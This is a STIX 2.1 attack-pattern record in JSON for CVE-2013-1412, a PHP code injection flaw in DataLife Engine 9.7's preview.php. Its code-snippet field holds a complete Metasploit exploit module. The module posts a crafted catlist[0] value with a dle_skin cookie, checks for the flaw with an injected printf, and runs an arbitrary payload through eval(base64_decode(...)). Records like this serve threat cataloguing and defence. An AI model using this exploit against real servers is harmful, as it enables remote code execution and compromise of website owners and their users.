{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ccb47b03-5e82-4078-998b-2201ac4f2bf7",
    "created": "2024-08-14T17:13:00.612791Z",
    "modified": "2024-08-14T17:13:00.612795Z",
    "name": "DataLife Engine preview.php PHP Code Injection",
    "description": " This module exploits a PHP code injection vulnerability DataLife Engine 9.7. The vulnerability exists in preview.php, due to an insecure usage of preg_replace() with the e modifier, which allows to inject arbitrary php code, when there is a template installed which contains a [catlist] or [not-catlist] tag, even when the template isn't in use currently. The template can be configured with the TEMPLATE datastore option. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/datalife_preview_exec.rb",
            "external_id": "datalife_preview_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1412"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/KIS-2013-01"
        },
        {
            "source_name": "reference",
            "url": "http://dleviet.com/dle/bug-fix/3281-security-patches-for-dle-97.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DataLife Engine preview.php PHP Code Injection',\n      'Description'    => %q{\n          This module exploits a PHP code injection vulnerability DataLife Engine 9.7.\n        The vulnerability exists in preview.php, due to an insecure usage of preg_replace()\n        with the e modifier, which allows to inject arbitrary php code, when there is a\n        template installed which contains a [catlist] or [not-catlist] tag, even when the\n        template isn't in use currently. The template can be configured with the TEMPLATE\n        datastore option.\n      },\n      'Author'         =>\n        [\n          'EgiX', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-1412' ],\n          [ 'OSVDB', '89662' ],\n          [ 'EDB', '24438' ],\n          [ 'BID', '57603' ],\n          [ 'URL', 'http://karmainsecurity.com/KIS-2013-01' ],\n          [ 'URL', 'http://dleviet.com/dle/bug-fix/3281-security-patches-for-dle-97.html' ]\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          'Keys'   => ['php']\n        },\n      'DisclosureDate' => '2013-01-28',\n      'Targets'        => [ ['DataLife Engine 9.7', { }], ],\n      'DefaultTarget'  => 0\n      ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"The base path to the web application\", \"/\"]),\n        OptString.new('TEMPLATE', [ true, \"Template with catlist or not-catlit tag\", \"Default\"])\n      ])\n  end\n\n  def uri\n    normalize_uri(target_uri.path, 'engine', 'preview.php')\n  end\n\n  def send_injection(inj)\n    res = send_request_cgi(\n      {\n        'uri'       =>  uri,\n        'method'    => 'POST',\n        'vars_post' =>\n          {\n            'catlist[0]' => inj\n          },\n        'cookie'   => \"dle_skin=#{datastore['TEMPLATE']}\"\n      })\n    res\n  end\n\n  def check\n    fingerprint = rand_text_alpha(4+rand(4))\n\n    res = send_injection(\"#{rand_text_alpha(4+rand(4))}')||printf(\\\"#{fingerprint}\\\");//\")\n\n    if res and res.code == 200 and res.body =~ /#{fingerprint}/\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_status(\"Exploiting the preg_replace() to execute PHP code\")\n    res = send_injection(\"#{rand_text_alpha(4+rand(4))}')||eval(base64_decode(\\\"#{Rex::Text.encode_base64(payload.encoded)}\\\"));//\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-28",
    "x_mitre_platforms": [
        "['php']"
    ]
}